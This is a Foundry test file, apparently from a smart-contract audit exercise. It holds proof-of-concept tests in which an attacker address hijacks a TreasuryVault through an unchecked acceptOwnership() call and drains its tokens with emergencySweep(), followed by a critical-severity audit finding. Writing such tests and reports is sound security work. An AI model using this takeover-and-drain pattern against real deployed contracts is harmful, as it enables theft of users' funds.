// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/201-AccessControlTVault.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1_000_000e18);
    }
}

contract TreasuryVaultTest is Test {

    TreasuryVault vault;
    MockERC20 token;

    address owner;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");

        vm.startPrank(owner);
        token = new MockERC20();
        vault = new TreasuryVault(address(token));
        vm.stopPrank();
    }

    function testAttackerTakesOwnership() public {
        // confirm owner before attack
        assertEq(vault.owner(), owner);
        console.log("owner before:", vault.owner());

        // attacker calls acceptOwnership directly — no pendingOwner set
        vm.prank(attacker);
        vault.acceptOwnership();

        console.log("owner after:", vault.owner());
        assertEq(vault.owner(), attacker);
    }

    function testAttackerSweepsTreasuryAfterTakeover() public {
        // owner funds the vault
        vm.startPrank(owner);
        token.approve(address(vault), 100_000e18);
        vault.addToWhitelist(owner);
        vault.createGrant(owner, 100_000e18, 0);
        vm.stopPrank();

        uint256 vaultBalance = token.balanceOf(address(vault));
        assertEq(vaultBalance, 100_000e18);

        // attacker takes ownership
        vm.prank(attacker);
        vault.acceptOwnership();
        assertEq(vault.owner(), attacker);

        // attacker sweeps everything
        vm.prank(attacker);
        vault.emergencySweep(attacker);

        console.log("attacker balance:", token.balanceOf(attacker));
        assertEq(token.balanceOf(attacker), 100_000e18);
        assertEq(token.balanceOf(address(vault)), 0);
    }
}

    /**
     * Audit Report
     * Missing access control on acceptOwnership() allows anyone to hijack contract ownership
     * 
     * Severity: Critical
     * Location: TreasuryVault.sol → acceptOwnership()
     * Description: The acceptOwnership() function sets owner = msg.sender without verifying that the
     * caller is the pendingOwner. Any address can call this function at any time — even without a 
     * transfer being initiated — and immediately become the contract owner.
     * 
     * Impact: An attacker who calls acceptOwnership gains full owner privileges. They can call
     * emergencySweep() to drain all tokens from the vault, add or remove whitelist addresses,
     * and create or manipulate grants. All funds held by the contract are at risk.
     */